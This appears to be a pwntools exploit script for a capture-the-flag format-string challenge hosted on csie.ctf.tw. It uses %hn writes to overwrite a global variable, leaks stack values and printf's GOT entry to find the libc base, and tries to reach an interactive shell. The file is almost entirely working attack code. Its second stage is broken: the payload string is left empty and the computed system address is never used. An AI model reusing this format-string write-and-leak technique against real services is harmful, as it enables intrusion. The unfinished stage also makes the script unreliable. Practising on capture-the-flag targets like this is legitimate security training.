#!/usr/bin/env python2
import sys, time

from pwn import *

file = './fmt'
# server, port = 'localhost'  , 9999
server, port = 'csie.ctf.tw', 10129

r, context.binary = remote(server, port), file
# ========================================================================
file_elf, libc_elf = ELF( file ), ELF("libc-2.27.so")

a_addr  = 0x6012ac
a_value = 0xfaceb00c

# fmt_str = '%x.' * 20
# r.sendafter( "What's your name ?\n",  fmt_str )
# r.recvuntil('Hello:\n', drop= True)
# print r.recv()
# output: c8fef7e3.c8ff08c0.c8d13154.6.c92184c0.c921da98.0.8376ed7d.bf6f6d58.b01045.
#         0.c41eb1d8.c921d710.0.0.252e7825.2e78252e.78252e78.252e7825.2e78252e.

# fmt_str = '%20$p'.ljust( 0x20, '\x00' ) + p64( 0x12345678 )
# r.sendafter( "What's your name ?\n",  fmt_str )
# r.recvuntil('Hello:\n', drop= True)
# print r.recv()
# output: 0x12345678

# print a_value & 0xffff, a_value >> 16, (a_value >> 16) - (a_value & 0xffff)
# output: 45068 64206 19138

fmt_str = '%45068c%24$hn%19138c%25$hn|%8$p.%9$p|%26$s|'.ljust( 0x40, '\x00' ) + \
            p64( a_addr ) + p64( a_addr+2 ) + p64( file_elf.got["printf"] )
r.sendafter( "What's your name ?\n",  fmt_str )
r.recvuntil( '|', drop= True )  # ignore too more space

secret    = r.recvuntil('|')[0:-1].split('.')
secret    = p64( int( secret[0], 16 ) ) + p64( int( secret[1], 16 ) )
libc_base = u64( r.recvuntil('|')[0:-1].ljust( 8, '\x00' ) ) - libc_elf.symbols["printf"]

print r.recvuntil('}')

r.sendafter( "Do you know my secret :P ?\n", secret )
print r.recvuntil('}')

system_got = libc_base + libc_elf.symbols["system"]
fmt_str = ''

r.recvuntil( 'Hello! my friend! Say something to Osass:\n', drop= True )
r.send( fmt_str )

r.recvuntil( 'You said:\n', drop= True )
r.recvuntil( '|', drop= True ) # ignore too more space
r.recvuntil( 'Say something again!\n', drop= True )
r.send( "sh" )

r.interactive()
